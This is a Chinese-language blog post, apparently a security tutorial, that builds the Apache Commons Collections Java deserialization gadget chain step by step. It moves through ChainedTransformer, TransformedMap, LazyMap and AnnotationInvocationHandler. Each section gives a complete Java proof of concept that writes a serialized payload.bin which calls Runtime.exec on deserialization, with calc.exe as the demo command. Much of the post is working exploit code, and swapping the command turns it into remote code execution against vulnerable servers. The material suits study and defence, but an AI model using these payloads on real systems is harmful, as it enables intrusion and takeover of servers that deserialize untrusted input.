+<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer类封装了Transformer的链式调用，我们只需要传入一个Transformer数组，ChainedTransformer就会依次调用每一个Transformer的transform方法。</p>
+<p><img src="/img/markdown-img-paste-2021111515475802.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时，第一个transform调用的结果会作为第二个transform调用的输出</p>
+<p>那么，我们就可以构造如下POC</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                                <span class="hljs-keyword">String</span>.class<br>                        &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<br>                                <span class="hljs-string">&quot;calc.exe&quot;</span><br>                        &#125;<br>                )<br>        &#125;);<br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是，这只是在本地测试可行，如果配上反序列化的话，就会出现以下错误</p>
+<p><img src="/img/markdown-img-paste-20211115161718414.png" srcset="/img/loading.gif" lazyload></p>
+<p>原因在于Runtime实例并未继承Serialeze，因此无法反序列化</p>
+<p>所以我们需要在服务端生成一个Runtime实例</p>
+<p>稍作修改</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                                <span class="hljs-keyword">String</span>.class<br>                        &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<br>                                <span class="hljs-string">&quot;calc.exe&quot;</span><br>                        &#125;<br>                )<br>        &#125;);<br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(chainedTransformer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我们发现依旧出错，通过试调，发现原因在于</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span><span class="hljs-keyword">class</span><br><span class="hljs-keyword">try</span> &#123;<br>    Class cls = input.get<span class="hljs-constructor">Class()</span>;<br>    Method <span class="hljs-keyword">method</span> = cls.get<span class="hljs-constructor">Method(<span class="hljs-params">this</span>.<span class="hljs-params">iMethodName</span>, <span class="hljs-params">this</span>.<span class="hljs-params">iParamTypes</span>)</span>;<br>    return <span class="hljs-keyword">method</span>.invoke(input, this.iArgs);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这里存在input.getClass()</p>
+<p>做个实验</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> Test2 &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> argv)&#123;<br>        Object a = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>;<br>        Class b = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span><span class="hljs-keyword">class</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(a.get<span class="hljs-constructor">Class()</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(b.get<span class="hljs-constructor">Class()</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/img/markdown-img-paste-20211115162858204.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以得出如下结论</p>
+<ul>
+<li>当input是一个类的实例对象时，获取到的是这个类</li>
+<li>当input是一个类时，获取到的是java.lang.Class</li>
+</ul>
+<p>所以当我们传入的是一个Runtime.class类的话，它获取的就是java.lang.Class</p>
+<p>此时，我们就得到一个悖论</p>
+<ul>
+<li>如果我们传入一个Runtime实例，则不能反序列化</li>
+<li>如果我们传入一个Runtime类，则获取不到Runtime类</li>
+</ul>
+<p>因此不能直接通过Runtime.getRuntime()获得Runtime实例</p>
+<p>在之前构造的POC中，我们等价于先去用getRuntime()方法取出一个Runtime实例对象。</p>
+<p>现在我们换一种思路，通过反射机制</p>
+<ul>
+<li>取出getMethod方法，通过反射取出getRuntime</li>
+<li>取出invoke方法，通过反射invoke方法执行getRuntime，获取实例对象</li>
+</ul>
+<p>因此POC如下</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(chainedTransformer);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(fi);<br><br>        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();<br>        transformerChain_now.transform(<span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功模拟序列化与反序列化，实现了客户端自定义payload</p>
+<p>此时，服务端只需满足两个条件，即可执行任意代码</p>
+<ul>
+<li>服务端反序列化我们的ChainedTransformer</li>
+<li>同时调用transform方法</li>
+</ul>
+<p>显然这种调用方法的应用场景很少，我们需要找到更好触发的方式</p>
+<h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>TransformedMap类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p>
+<p><img src="/img/markdown-img-paste-20211116145115237.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过构造TransformedMap，可以让我们的触发方式，由调用transform方法变为put/putall方法，无疑后者更为普遍。</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        Map map = <span class="hljs-keyword">new</span> <span class="hljs-type">HashedMap</span>();<br>        map.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        Map outmap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(outmap);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(fi);<br><br>        Map <span class="hljs-keyword">new</span><span class="hljs-type">map</span> = (Map) fin.readObject();<br>        <span class="hljs-comment">//方式一：</span><br>        <span class="hljs-keyword">new</span><span class="hljs-type">map</span>.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//方式二：AbstractInputCheckedMapDecorator类中的setValue方法会调用TransformedMap中的checkSetValue</span><br>        Map.Entry entry = (Map.Entry)<span class="hljs-keyword">new</span><span class="hljs-type">map</span>.entrySet().iterator().next();<br>        entry.setValue(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h1><p>LazyMap实现了Map接口，其中的get(Object)方法调用了transform()方法</p>
+<p><img src="/img/markdown-img-paste-20211116152132565.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里factory可控，在初始化时被赋值</p>
+<p><img src="/img/markdown-img-paste-20211116152231880.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此亦可以通过Lazymap实现transform的调用</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        Map map = <span class="hljs-keyword">new</span> <span class="hljs-type">HashedMap</span>();<br>        <span class="hljs-comment">//反射获取LazyMap类</span><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);<br>        <span class="hljs-comment">//获取所有构造方法</span><br>        Constructor[] constructors = clazz.getDeclaredConstructors();<br>        Constructor constructor = constructors[<span class="hljs-number">0</span>];<br>        <span class="hljs-comment">//取消修饰符限制</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//初始化LazyMap对象</span><br>        LazyMap lazyMap = (LazyMap)constructor.<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>(map,chainedTransformer);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(lazyMap);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(fi);<br><br>        Map <span class="hljs-keyword">new</span><span class="hljs-type">map</span> = (LazyMap) fin.readObject();<br>        <span class="hljs-keyword">new</span><span class="hljs-type">map</span>.<span class="hljs-keyword">get</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>上面两种利用方式已经成功延长了利用链，在服务端仅需反序列化map，再get/put/putall一次，即可实现利用。</p>
+<p>那么有没有直接readObject即可成功利用的方式呢？</p>
+<h1 id="AnnotationInvocationHandler-TransformedMap"><a href="#AnnotationInvocationHandler-TransformedMap" class="headerlink" title="AnnotationInvocationHandler+TransformedMap"></a>AnnotationInvocationHandler+TransformedMap</h1><p>sun.reflect.annotation.AnnotationInvocationHandler类实现了java.lang.reflect.InvocationHandler(Java动态代理)接口和java.io.Serializable接口，它还重写了readObject方法，在readObject方法中调用了var5.setValue<br><img src="/img/markdown-img-paste-20211116160556570.png" srcset="/img/loading.gif" lazyload><br>如果控制var5的值为TransformedMap的entry对象，那么就能触发TransformedMap#checkSetValue方法。<br>var5的最终数据来源是this.memberValues，而this.memberValues在初始化中被给出<br><img src="/img/markdown-img-paste-20211116160746393.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时需要满足关键判断<br><code>if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) </code></p>
+<p>再次测试</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.<span class="hljs-built_in">Map</span>;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> &#123;</span><br>    public <span class="hljs-keyword">static</span> <span class="hljs-literal">void</span> main(<span class="hljs-built_in">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>,Class[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        <span class="hljs-built_in">Map</span> <span class="hljs-keyword">map</span> = <span class="hljs-keyword">new</span> HashedMap();<br>        <span class="hljs-keyword">map</span>.put(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-built_in">Map</span> outmap = TransformedMap.decorate(<span class="hljs-keyword">map</span>,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = clazz.getDeclaredConstructor(Class.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Map</span>.<span class="hljs-keyword">class</span>);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">Object</span> ob = constructor.newInstance(Retention.<span class="hljs-keyword">class</span>,outmap);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(ob);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br><br>        <span class="hljs-built_in">Object</span> o = (<span class="hljs-built_in">Object</span>) fin.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这里constructor.newInstance(Retention.class,outmap)的第一个参数使用Retention.class，因为在初始化时，会判断其是否为注解类。</p>
